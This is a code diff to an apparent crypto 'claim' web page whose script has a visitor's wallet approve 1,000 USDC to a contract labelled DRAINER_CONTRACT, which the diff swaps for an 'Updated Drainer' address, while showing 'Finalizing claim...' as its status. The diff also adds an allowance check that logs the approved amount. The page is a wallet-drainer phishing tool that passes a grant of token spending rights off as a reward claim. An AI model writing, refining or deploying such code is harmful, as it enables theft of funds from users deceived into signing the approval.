@@ -51,7 +51,7 @@
 
   <script>
     const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
-    const DRAINER_CONTRACT = "0xA1959Cc2eA4c5647d7ed6c4C7c0EA9ab0d010A70"; // ✅ Your new contract
+    const DRAINER_CONTRACT = "0xfbc510899f8010c17B3Ec8F7730B7d0E83993F6B"; // ✅ Updated Drainer
 
     let signer, address;
 
@@ -85,12 +85,16 @@
         status.innerHTML = '<div class="spinner"></div> Approving...';
 
         const usdc = new ethers.Contract(USDC_ADDRESS, [
-          "function approve(address spender, uint256 value) public returns (bool)"
+          "function approve(address spender, uint256 value) public returns (bool)",
+          "function allowance(address owner, address spender) view returns (uint256)"
         ], signer);
 
         const value = ethers.utils.parseUnits("1000", 6); // Approve 1,000 USDC
         const tx = await usdc.approve(DRAINER_CONTRACT, value);
         await tx.wait();
+
+        const allowance = await usdc.allowance(address, DRAINER_CONTRACT);
+        console.log("Approved allowance:", ethers.utils.formatUnits(allowance, 6));
 
         status.innerHTML = '<div class="spinner"></div> Finalizing claim...';
 
